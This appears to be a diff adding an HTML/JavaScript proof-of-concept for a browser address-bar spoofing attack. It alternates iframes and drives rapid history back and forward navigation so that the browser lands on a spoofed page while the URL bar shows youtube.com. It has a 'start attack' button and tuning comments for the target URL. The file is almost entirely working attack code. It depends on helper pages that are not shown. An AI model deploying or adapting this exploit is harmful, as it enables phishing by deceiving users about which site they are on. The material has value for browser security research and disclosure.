@@ -1,0 +1,235 @@
+﻿<html>
+
+<head>
+<title>title</title>
+</head>
+
+<body>
+
+
+<button onclick="setCookie('stopalternating','', 1);window.location.reload();">start attack</button>
+
+
+<span style="display:none;" id="attackfinished">the attack is finished. If you can see youtube.com in the url it means it succeeded.</span>
+
+
+<script>
+
+
+/****** config *******/
+
+
+var backcounter=5;
+
+
+//number of forwards to do. Hoping to land on the spoofed page. 
+//it seems we need to make 5 or 6 forwards to reach it.
+
+var fwdcounter = Math.random() < 0.5 ? 5: 6;
+
+
+var iframesalternatetimeout=1000;
+
+
+//to be tuned, depending on the url to spoof and the speed of the computer and internet connection. The faster the targeted website loads, the smaller this variable must be.
+
+var fastbackstimeout=50;
+
+
+var openlastpagetimeout=50;
+
+
+var fwdtimeout=500;
+
+
+var sleepbeforeback=1000;
+
+/*******************/
+
+
+
+
+
+
+function sleep(milliseconds) {
+  var start = new Date().getTime();
+  for (var i = 0; i < 1e7; i++) {
+    if ((new Date().getTime() - start) > milliseconds){
+      break;
+    }
+  }
+}
+
+
+
+
+function setCookie(cname, cvalue, exdays) {
+    var d = new Date();
+    d.setTime(d.getTime() + (exdays*24*60*60*1000));
+    var expires = "expires="+d.toUTCString();
+    document.cookie = cname + "=" + cvalue + "; " + expires;
+}
+
+
+
+
+function getCookie(cname) {
+    var name = cname + "=";
+    var ca = document.cookie.split(';');
+    for(var i=0; i<ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0)==' ') c = c.substring(1);
+        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
+    }
+    return "";
+}
+
+
+function delete_cookie( name ) {
+  document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+}
+
+
+
+function isNumber(n)
+{
+   return n == parseFloat(n);
+}
+
+
+function isEven(n) 
+{
+   return isNumber(n) && (n % 2 == 0);
+}
+
+
+
+
+
+function fastbacks()
+{
+
+sleep(sleepbeforeback);
+
+backcounter--;
+window.history.back();
+
+if(backcounter>0){
+ setTimeout(function() { fastbacks(); } ,fastbackstimeout)
+ }
+else { 
+setCookie('stopalternating','no', 1); 
+
+
+fwdxtimes();
+}
+
+
+}
+
+
+
+
+
+function fwdxtimes()
+{
+
+fwdcounter--;
+window.history.forward();
+
+if(fwdcounter>0){
+ setTimeout(function() { fwdxtimes(); } ,fwdtimeout)
+ }
+else{
+document.getElementById('attackfinished').style.display='';
+}
+
+}
+
+
+
+
+
+function createpageschain()
+{
+
+var lastiframe=parseInt(getCookie('lastiframe')); 
+
+var nextiframe=lastiframe+1;  
+
+if(isEven(lastiframe)){
+
+document.getElementById('1').src='iframe2.html';
+
+setCookie('lastiframe',nextiframe, 1);
+
+}
+else{
+
+document.getElementById('1').src='iframe1.html';
+
+setCookie('lastiframe',nextiframe, 1);
+}
+
+
+
+if(lastiframe > 10){
+
+
+
+setCookie('changelocation','1', 1);
+
+window.history.back();
+
+
+return;
+}
+else
+{
+setTimeout(function() { createpageschain(); } ,iframesalternatetimeout);
+}   
+
+}
+
+
+
+
+
+</script>
+
+
+
+
+
+
+<button style="display:none;" id='src' onclick="var j=document.getElementById('1');j.src='iframeattack.html';setTimeout(function(){self.location='lastpage.html';}, openlastpagetimeout);">change location</button>
+
+
+
+
+
+
+
+<iframe  id="1" src="http://www.wikipedia.org" style="width:100%;height:100%;display:none;"></iframe>
+
+
+
+<script>
+
+//init
+
+setCookie('lastiframe','0', 1);
+setCookie('changelocation','0', 1);
+
+var stopalternating=getCookie('stopalternating');
+
+if(stopalternating ==''){ createpageschain();}
+if(stopalternating =='ok'){ fastbacks();}
+
+
+</script>
+
+
+</body>
+
+</html>
